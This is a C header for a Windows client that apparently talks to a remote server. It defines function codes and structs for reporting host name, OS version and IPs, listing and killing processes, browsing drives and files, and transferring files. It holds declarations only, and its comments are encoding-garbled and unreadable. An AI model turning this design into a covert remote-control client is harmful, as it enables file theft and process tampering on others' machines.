#pragma once
#include <stdio.h>
#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")
#include <VersionHelpers.h>
#include <TlHelp32.h>
#include <Psapi.h>

//=================================================================
//���繦���� 
#define MSG_FUNCTION_CODE_NETWIRKING 0x1		//����
#define MSG_FUNCTION_CODE_GET_PROCESS_LIST 0x2	//�����б�
#define MSG_FUNCTION_CODE_KEILL_PROCESS 0x3		//��������
#define MSG_FUNCTION_CODE_DEIVE_LETTER 0x4		//��ȡ�̷�
#define MSG_FUNCTION_CODE_FILE_TRAVERSAL 0x5	//�����ļ�
#define MSG_FUNCTION_CODE_GET_FILE_INFO 0x6		//��ȡ�ļ��ߴ�
#define MSG_FUNCTION_CODE_GET_FILE 0x7			//��ȡ�ļ�
#define MSG_FUNCTION_CODE_SEND_FILE 0x8			//�����ļ���Ϣ
#define MSG_FUNCTION_CODE_FILE_BUFFER 0x9		//�����ļ�����
//=================================================================




//=================================================================
//�ṹ��
typedef struct _LinkInfo
{
	DWORD dwFuncCode;	//���ܺ�
	char szComputerName[30];	//���������
	char szSystenVersion[30];	//�����ϵͳ�汾
	char szIntranetIP[20];	//����IP
	char szNetWorkIP[20];	//����IP
}LinkInfo, * PLinkInfo;

//������Ϣ�ṹ
typedef struct _ProcessListInfo
{
	DWORD dwFuncCode;				//���ܺ�
	DWORD dwProcessID;				//����ID
	DWORD dwParenProcessID;			//������ID
	char szProcessName[128];		//������
	char szProcessPath[MAX_PATH];	//����·��
}ProcessListInfo, * ProcessListInfo_PTR;

//�������̽ṹ
typedef struct _KillProcessInfo
{
	DWORD dwFuncCode;				//���ܺ�
	DWORD dwProcessID;				//����ID
}KillProcessInfo, * PKillProcessInfo;

//�̷������ṹ
typedef struct _DriveLetterInfo
{
	DWORD dwFuncCode;				//���ܺ�
	char szDisk[10];				//�̷�����
	char szDiskType[20];			//�̷�����
	SHFILEINFO FileInfo;			//�ļ���Ϣ
}DriveLetterInfo, * PDriveLetterInfo;

//�ļ������ṹ
typedef struct _DiskFileInfo
{
	DWORD dwFuncCode;				//���ܺ�
	char szFilePath[MAX_PATH];		//�ļ�·��
	char szFileInfo[50];			//��ע��Ϣ
	SHFILEINFO FileInfo;			//�ļ���Ϣ
}DiskFileInfo, * PDiskFileInfo;

//�ļ�ȡ�ؽṹ
typedef struct _GetFileInfo
{
	DWORD dwFuncCode;				//���ܺ�
	DWORD dwFileSize;				//�ļ��ߴ�
	char szFilePath[MAX_PATH];		//�ļ�·��
}GetFileInfo, * PGetFileInfo;

//=================================================================


//=================================================================
// ȫ�ֱ���
SOCKET SocketClient;
sockaddr_in AddrServer;
LinkInfo NetWorkingBuffer;
ProcessListInfo ProcessListBuffer;
DriveLetterInfo DriveLetterBuffer;
DiskFileInfo DiskFileBuffer;
GetFileInfo GetFileBuffer;
//=================================================================
typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);
//=================================================================
//��������
BOOL InitSocket();//��ʼ������
BOOL CleanSocket();//��������
BOOL InitNetWorkingInfo();//��ʼ�����߽ṹ
BOOL GetSystemOSVersion(char* szBuffer);//��ȡϵͳ�汾
BOOL SendInfoToServer(DWORD dwCode);//��������
DWORD GetWinVer();//Win8���ϰ汾�Ż�ȡ
BOOL SendInfoToServer(DWORD dwCode);//ִ�й��ܺŲ�����
VOID SendData(LPVOID lpSendBuffer, DWORD64 dwBufferLength);//��̬��������
VOID NwSendData(LPVOID lpSendBuffer, DWORD64 dwBufferLength);
DWORD GetSocketData(LPVOID* lpRetFileBuffer);//��̬��������
BOOL SocketThreadCallBack(LPVOID lpBuffer);//ִ�й��ܺŻص�
BOOL SendProcessList();//�����߳���Ϣ
BOOL KillProcess(DWORD dwProcessID);//��������
BOOL GetDriver();//�����̷�
BOOL TraversalFiles(PCHAR pcPath);//��ȡ�ļ�Ŀ¼��Ϣ
//=================================================================